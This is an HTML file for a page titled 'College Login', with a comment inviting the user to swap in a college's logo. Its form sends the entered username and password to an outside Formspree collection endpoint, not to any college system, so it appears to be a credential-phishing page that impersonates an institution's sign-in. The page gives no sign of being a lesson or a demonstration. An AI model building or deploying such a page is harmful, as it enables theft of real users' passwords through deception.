<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>College Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#4facfe,#00f2fe);
}

.login-box{
    width:350px;
    background:#fff;
    padding:35px;
    border-radius:15px;
    box-shadow:0 10px 30px rgba(0,0,0,0.2);
    text-align:center;
}

.logo{
    width:120px;
    height:120px;
    object-fit:contain;
    margin-bottom:15px;
}

h2{
    margin-bottom:25px;
    color:#333;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    margin-top:15px;
    border:none;
    border-radius:8px;
    background:#007BFF;
    color:white;
    font-size:16px;
    cursor:pointer;
    transition:.3s;
}

button:hover{
    background:#0056b3;
}
</style>

</head>
<body>

<div class="login-box">

    <!-- Replace logo.png with your college logo -->
    <img src="logo.png" alt="apec.1.png" class="logo">

    <h2>College Login</h2>

    <form action="https://formspree.io/f/mwvdwjjk" method="POST">

        <input
            type="text"
            name="Username"
            placeholder="Enter Username"
            required>

        <input
            type="password"
            name="Password"
            placeholder="Enter Password"
            required>

        <button type="submit">
            Login
        </button>

    </form>

</div>

</body>
</html>
